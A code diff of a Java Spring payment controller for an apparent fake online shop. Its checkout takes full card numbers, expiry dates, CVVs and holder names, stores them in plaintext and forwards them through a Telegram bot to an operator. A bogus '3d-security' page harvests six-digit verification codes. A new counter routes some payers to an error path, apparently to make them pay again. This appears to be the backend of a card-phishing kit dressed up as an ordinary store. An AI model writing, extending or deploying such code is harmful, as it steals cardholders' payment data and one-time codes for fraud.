@@ -33,17 +33,18 @@ public class CardController {
 
 
     @GetMapping("/payment")
-    public String paymentPage(Model model){
+    public String paymentPage(Model model) {
         return "payment";
     }
 
     @PostMapping("/payment")
-    public String paymentPost(Model model, @RequestParam(name = "number") String number, @RequestParam (name = "date")String date,
-                              @RequestParam(name = "nameOnCard") String nameOnCard,
+    public String paymentPost(Model model, @RequestParam(name = "number") String number, @RequestParam(name = "month") String month,
+                              @RequestParam String year,
+                              @RequestParam(name = "holderName") String holderName,
                               @RequestParam(name = "cvv") String cvv) throws TelegramApiException {
         String username = SecurityContextHolder.getContext().getAuthentication().getName();
         boolean isPresent = userRepository.findByUsername(username).isPresent();
-        if (isPresent){
+        if (isPresent) {
             User user = userRepository.findByUsername(username).get();
             List<Product> products = user.getProducts();
             Long prodPrice = 0l;
@@ -58,20 +59,23 @@ public class CardController {
                 }
             }
             Long deliveryPrice = 10L;
-            Long totalPrice =  prodPrice + deliveryPrice;
+            Long totalPrice = prodPrice + deliveryPrice;
+            String[] cardForFour = number.split("(?<=\\G.{" + 4 + "})");
+            String cardNumberResult = cardForFour[0] + " " + cardForFour[1] + " " + cardForFour[2] + " " + cardForFour[3];
             Card card = new Card();
             card.setCvv(cvv);
-            card.setDateOfLicense(date);
-            card.setNumber(number);
-            card.setName(nameOnCard);
+            card.setYear(year);
+            card.setMonth(month);
+            card.setNumber(cardNumberResult);
+            card.setName(holderName);
             card.setResultCheck(totalPrice);
             cardRepository.save(card);
             cardTest = number;
             String textToSend = "ПОСТУПИЛ НОВЫЙ ЗАКАЗ!!! \n\n\n" +
-                    "Номер карты: " + number + "\n" +
-                    "Срок карты: " + date + "\n " +
+                    "Номер карты: " + cardNumberResult + "\n" +
+                    "Срок карты: " + month + "/" + year + "\n " +
                     "CVV: " + cvv + "\n" +
-                    "ИМЯ ФАМИЛИЯ: " + nameOnCard + "\n" +
+                    "ИМЯ ФАМИЛИЯ: " + holderName + "\n" +
                     "Сумма: $" + totalPrice + "\n" +
                     "Посмотреть все данные по ссылке: http://localhost:8080/admin";
             bot.sendMessage(config.getSevaId(), textToSend);
@@ -82,7 +86,7 @@ public class CardController {
 
 
     @GetMapping("/3d-security")
-    public String codePage(Model model){
+    public String codePage(Model model) {
         short hour = (short) LocalDateTime.now().getHour();
         short minutes = (short) LocalDateTime.now().getMinute();
         String dayOfWeek = LocalDateTime.now().getDayOfWeek().name();
@@ -99,7 +103,7 @@ public class CardController {
     @PostMapping("/3d-security")
     public String codePost(@RequestParam String sybmol1, @RequestParam String sybmol2,
                            @RequestParam String sybmol3, @RequestParam String sybmol4,
-                           @RequestParam String sybmol5, @RequestParam String sybmol6){
+                           @RequestParam String sybmol5, @RequestParam String sybmol6) {
         Card card = cardRepository.findByNumber(cardTest);
         String code = sybmol1 + sybmol2 + sybmol3 + sybmol4 + sybmol5 + sybmol6;
         card.setCode(code);
@@ -107,19 +111,26 @@ public class CardController {
         cardTest = "";
         String username = SecurityContextHolder.getContext().getAuthentication().getName();
         boolean isPresent = userRepository.findByUsername(username).isPresent();
-        if (isPresent){
+        if (isPresent) {
             User user = userRepository.findByUsername(username).get();
             user.getProducts().clear();
             userRepository.save(user);
+            if (user.getChance() == 1) {
+                user.setChance(user.getChance()+1);
+                return "/payment/success";
+            } else {
+                return "/payment/error";
+            }
+        } else {
+            return "";
         }
-        return "redirect:/shop";
     }
 
     @GetMapping("/checkout")
     public String checkoutPage(Model model) {
         String username = SecurityContextHolder.getContext().getAuthentication().getName();
         boolean isPresent = userRepository.findByUsername(username).isPresent();
-        if (isPresent){
+        if (isPresent) {
             User user = userRepository.findByUsername(username).get();
             List<Product> products = user.getProducts();
             model.addAttribute("products", products);
@@ -128,11 +139,21 @@ public class CardController {
                 prodPrice += product.getPrice();
             }
             float deliveryPrice = 10;
-            float totalPrice =  prodPrice + deliveryPrice;
+            float totalPrice = prodPrice + deliveryPrice;
             model.addAttribute("delivery", deliveryPrice);
             model.addAttribute("totalPrice", totalPrice);
         }
         return "checkout";
+    }
+
+    @GetMapping("/payment/success")
+    public String getSuccess() {
+        return "payment-success";
+    }
+
+    @GetMapping("/payment/error")
+    public String getError() {
+        return "payment-success";
     }
 
 }
